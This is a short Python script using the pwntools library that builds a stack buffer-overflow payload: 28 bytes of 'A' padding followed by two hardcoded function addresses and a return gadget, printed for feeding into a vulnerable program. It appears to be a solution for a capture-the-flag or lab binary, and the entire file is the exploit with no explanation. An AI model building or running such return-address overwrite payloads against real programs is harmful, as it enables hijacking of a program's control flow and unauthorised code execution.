from pwn import *

func1 = p64(0x10000055c)
func2 = p64(0x100000578)
ret = p64(0x0000000100000518)


p = b"A"*28 + func1 + ret + func2
print(p)
